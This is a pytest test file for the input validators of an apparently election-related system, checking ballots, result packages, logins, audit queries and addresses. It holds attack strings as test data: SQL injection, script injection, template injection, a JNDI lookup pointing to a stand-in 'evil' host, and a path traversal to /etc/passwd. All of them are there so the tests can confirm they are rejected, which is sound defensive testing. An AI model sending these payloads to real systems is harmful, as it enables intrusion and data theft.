"""SR-15: validation accepts good input and rejects attack input."""

import pytest

from verification import validation as v


INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "\"; DROP TABLE voters;--",
    "1; SELECT * FROM anonymous_ballots",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{7*7}}",
    "${jndi:ldap://evil/x}",
    "../../etc/passwd",
    "Melbourne\n",
    "Melbourne\x00",
    "Melbоurne",          # Cyrillic o (look-alike letter)
    "ＡＢＣ",      # full-width letters
    "A" * 5000,
    "",
]


def test_valid_values_are_accepted():
    assert v.validate_election_id("election-2026") == "election-2026"
    assert v.validate_division("Melbourne") == "Melbourne"
    assert v.validate_division("Kennedy-O'Brien") == "Kennedy-O'Brien"
    assert v.validate_candidate_name("Anna M. Smith") == "Anna M. Smith"
    assert v.validate_candidate_id(7) == 7
    assert v.validate_credential("A" * 43) == "A" * 43
    assert v.validate_confirmation_reference("conf_" + "a" * 32)


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
@pytest.mark.parametrize(
    "validator",
    [
        v.validate_election_id,
        v.validate_division,
        v.validate_candidate_name,
        v.validate_credential,
        v.validate_confirmation_reference,
    ],
)
def test_injection_payloads_are_rejected(validator, payload):
    with pytest.raises(v.ValidationError):
        validator(payload)


@pytest.mark.parametrize("value", ["7", 7.0, None, True, False, 0, -1, 2**40, [1]])
def test_candidate_id_must_be_a_positive_plain_integer(value):
    with pytest.raises(v.ValidationError):
        v.validate_candidate_id(value)


@pytest.mark.parametrize("value", [None, 5, [], {}, b"Melbourne"])
def test_text_validators_reject_wrong_types(value):
    for validator in (v.validate_division, v.validate_candidate_name,
                      v.validate_election_id, v.validate_credential):
        with pytest.raises(v.ValidationError):
            validator(value)


def test_credential_length_is_exact():
    for length in (42, 44):
        with pytest.raises(v.ValidationError):
            v.validate_credential("A" * length)


def test_ballot_request_accepts_exact_fields():
    data = {"credential": "A" * 43, "candidate_id": 3}
    assert v.validate_ballot_request(data) == data


@pytest.mark.parametrize(
    "data",
    [
        {},
        {"credential": "A" * 43},
        {"candidate_id": 3},
        {"credential": "A" * 43, "candidate_id": 3, "voter_id": "x"},
        {"credential": "A" * 43, "candidate_id": "3"},
        {"credential": "' OR 1=1--", "candidate_id": 3},
        [],
        "text",
        None,
    ],
)
def test_ballot_request_rejects_bad_bodies(data):
    with pytest.raises(v.ValidationError):
        v.validate_ballot_request(data)


def _envelope(**changes):
    envelope = {
        "alg": "rsa-oaep-sha256+aes-256-gcm",
        "kid": "election:rsa-oaep:1",
        "v": 1,
        "wrapped_key": "QUJDRA==",
        "nonce": "QUJDRA==",
        "ct": "QUJDRA==",
    }
    envelope.update(changes)
    return envelope


def test_valid_envelope_is_accepted():
    envelope = _envelope()
    assert v.validate_ballot_envelope(envelope) == envelope


@pytest.mark.parametrize(
    "changes",
    [
        {"extra": "x"},
        {"alg": "<script>"},
        {"kid": "a b"},
        {"v": "1"},
        {"v": True},
        {"nonce": "not base64!!"},
        {"ct": ""},
        {"ct": "QUJD" * 5000},
        {"wrapped_key": 12},
    ],
)
def test_bad_envelopes_are_rejected(changes):
    with pytest.raises(v.ValidationError):
        v.validate_ballot_envelope(_envelope(**changes))


def test_envelope_with_missing_field_is_rejected():
    envelope = _envelope()
    del envelope["nonce"]
    with pytest.raises(v.ValidationError):
        v.validate_ballot_envelope(envelope)


def test_chain_stops_at_first_failing_check():
    calls = []

    def first(value):
        calls.append("first")
        raise v.ValidationError("f", "type")

    def second(value):
        calls.append("second")
        return value

    with pytest.raises(v.ValidationError):
        v.run_chain("x", first, second)

    assert calls == ["first"]


# Signed result package (sent to the results receiver)

def good_package():
    return {
        "result": {
            "election_id": "election-2026",
            "version": 1,
            "divisions": {"Melbourne": {"7": 2, "8": 1}},
            "ballots_counted": 3,
        },
        "signature": {
            "alg": "ed25519",
            "kid": "results.ed25519.v1",
            "v": 1,
            "sig": "zDr0u7yzznRj66xjOjThko+z+tMqjFgf78E3Tjmauu4LRueJBl6E"
                   "PSHNgR3/KkaAdIJosd7nUk84Jcb4HrC5CQ==",
        },
    }


def test_good_result_package_is_accepted():
    package = good_package()

    assert v.validate_result_package(package) is package


@pytest.mark.parametrize("change", [
    lambda p: p.update(extra=1),
    lambda p: p.pop("signature"),
    lambda p: p["result"].update(extra=1),
    lambda p: p["result"].update(version="1"),
    lambda p: p["result"].update(version=True),
    lambda p: p["result"].update(version=0),
    lambda p: p["result"].update(ballots_counted=-1),
    lambda p: p["result"].update(election_id="<script>alert(1)</script>"),
    lambda p: p["result"].update(divisions=[]),
    lambda p: p["result"]["divisions"].update({"' OR '1'='1": {"7": 1}}),
    lambda p: p["result"]["divisions"].update({"Melbourne": {"7; DROP": 1}}),
    lambda p: p["result"]["divisions"].update({"Melbourne": {"7": "1"}}),
    lambda p: p["result"]["divisions"].update({"Melbourne": {"7": -5}}),
    lambda p: p["result"]["divisions"].update({"Melbourne": [1]}),
    lambda p: p["signature"].update(sig="not base64 !!"),
    lambda p: p["signature"].update(sig="A" * 5000),
    lambda p: p["signature"].update(alg="<b>"),
    lambda p: p["signature"].update(extra=1),
])
def test_bad_result_packages_are_rejected(change):
    package = good_package()
    change(package)

    with pytest.raises(v.ValidationError):
        v.validate_result_package(package)


@pytest.mark.parametrize("junk", [None, [], "text", 7, {}])
def test_result_package_must_be_an_object_with_both_parts(junk):
    with pytest.raises(v.ValidationError):
        v.validate_result_package(junk)


def test_too_many_divisions_are_rejected():
    package = good_package()
    package["result"]["divisions"] = {
        f"Division {chr(65 + i % 26)}{chr(65 + i // 26)}": {"1": 1}
        for i in range(v.MAX_DIVISIONS + 1)
    }

    with pytest.raises(v.ValidationError):
        v.validate_result_package(package)


# Audit read query

STREAMS = ("identity", "ballot", "admin")


def test_good_audit_queries_are_accepted():
    assert v.validate_audit_query(
        {"stream": "identity"}, streams=STREAMS, allow_limit=True
    ) == ("identity", 50)
    assert v.validate_audit_query(
        {"stream": "ballot", "limit": "200"}, streams=STREAMS, allow_limit=True
    ) == ("ballot", 200)
    assert v.validate_audit_query(
        {"stream": "admin"}, streams=STREAMS, allow_limit=False
    ) == ("admin", 50)


@pytest.mark.parametrize("query,allow_limit", [
    ({}, True),
    ({"limit": "5"}, True),
    ({"stream": "secret"}, True),
    ({"stream": "identity", "extra": "1"}, True),
    ({"stream": "identity", "limit": "0"}, True),
    ({"stream": "identity", "limit": "201"}, True),
    ({"stream": "identity", "limit": "-1"}, True),
    ({"stream": "identity", "limit": "abc"}, True),
    ({"stream": "identity", "limit": "1000"}, True),
    ({"stream": "identity", "limit": "\u0665"}, True),   # Arabic digit
    ({"stream": "identity", "limit": "5"}, False),
    ({"stream": "identity\n"}, True),
    ({"stream": "' OR '1'='1"}, True),
    ({"stream": "<script>"}, True),
])
def test_bad_audit_queries_are_rejected(query, allow_limit):
    with pytest.raises(v.ValidationError):
        v.validate_audit_query(
            query, streams=STREAMS, allow_limit=allow_limit
        )


# Address update body

@pytest.mark.parametrize("address", [
    "Updated Test Address",
    "12/34 Smith St, Carlton VIC 3053",
    "Unit 5 (rear), 7 O'Brien Rd.",
    "  Padded Address  ",
])
def test_good_addresses_are_accepted(address):
    result = v.validate_address_update({"address_text": address})

    assert result == address.strip()


@pytest.mark.parametrize("body", [
    None, [], "text", {}, {"address_text": 5}, {"address_text": None},
    {"address_text": ""}, {"address_text": "   "},
    {"address_text": "A" * 256},
    {"address_text": "1 Main St", "owner_id": 9},
    {"address_text": "1 Main St", "id": 2},
    {"address_text": "<script>alert(1)</script>"},
    {"address_text": "1 Main St<img src=x onerror=alert(1)>"},
    {"address_text": "1 Main St'; DROP TABLE address_records;--"},
    {"address_text": "{{7*7}} Main St"},
    {"address_text": "1 Main St\n2 Other St"},
    {"address_text": "1 Main St\x00"},
    {"address_text": "1 Main St \u202e"},
    {"address_text": "1 Мain St"},          # Cyrillic M
])
def test_bad_address_updates_are_rejected(body):
    with pytest.raises(v.ValidationError):
        v.validate_address_update(body)


# Login bodies

def good_login():
    return {"account_id": "voter-001", "password": "SyntheticPassword!",
            "totp_code": "123456"}


def test_good_login_bodies_are_accepted():
    login = good_login()

    assert v.validate_login_request(login) is login
    assert v.validate_login_request(
        {**login, "account_id": "  voter-001  ", "password": "p" * 1024}
    )
    staff = {"staff_id": "officer-jane-citizen", "password": "x"}
    assert v.validate_staff_login_request(staff) is staff


@pytest.mark.parametrize("change", [
    {"extra": "1"},
    {"account_id": ""},
    {"account_id": "   "},
    {"account_id": 7},
    {"account_id": "a" * 129},
    {"account_id": "' OR '1'='1"},
    {"account_id": "<script>alert(1)</script>"},
    {"account_id": "voter\n001"},
    {"account_id": "vоter-001"},          # Cyrillic o
    {"password": ""},
    {"password": 5},
    {"password": None},
    {"password": "p" * 1025},
    {"totp_code": "12345"},
    {"totp_code": "1234567"},
    {"totp_code": "12345a"},
    {"totp_code": 123456},
    {"totp_code": "\u0661\u0662\u0663\u0664\u0665\u0666"},   # Arabic digits
    {"totp_code": "123456\n"},
])
def test_bad_login_bodies_are_rejected(change):
    with pytest.raises(v.ValidationError):
        v.validate_login_request({**good_login(), **change})


def test_login_body_with_a_missing_field_is_rejected():
    for field in ("account_id", "password", "totp_code"):
        login = good_login()
        del login[field]

        with pytest.raises(v.ValidationError):
            v.validate_login_request(login)


@pytest.mark.parametrize("body", [
    None, [], "x", {}, {"staff_id": "a"}, {"password": "x"},
    {"staff_id": "a", "password": "x", "role": "admin"},
    {"staff_id": "", "password": "x"},
    {"staff_id": "a" * 65, "password": "x"},
    {"staff_id": "officer jane", "password": "x"},
    {"staff_id": "' OR 1=1--", "password": "x"},
    {"staff_id": "officer-jane", "password": ""},
    {"staff_id": "officer-jane", "password": 12345},
])
def test_bad_staff_login_bodies_are_rejected(body):
    with pytest.raises(v.ValidationError):
        v.validate_staff_login_request(body)


# Tracking code lookup

def test_good_tracking_code_is_accepted():
    code = "sha256:" + "ab12" * 16

    assert v.validate_tracking_code_request({"tracking_code": code}) == code


@pytest.mark.parametrize("body", [
    None, [], {}, {"tracking_code": None}, {"tracking_code": 7},
    {"tracking_code": "sha256:" + "A" * 64},          # upper case
    {"tracking_code": "sha256:" + "a" * 65},
    {"tracking_code": "md5:" + "a" * 64},
    {"tracking_code": "sha256:" + "a" * 63 + "\n"},
    {"tracking_code": "sha256:" + "a" * 64, "x": 1},
])
def test_bad_tracking_code_requests_are_rejected(body):
    with pytest.raises(v.ValidationError):
        v.validate_tracking_code_request(body)
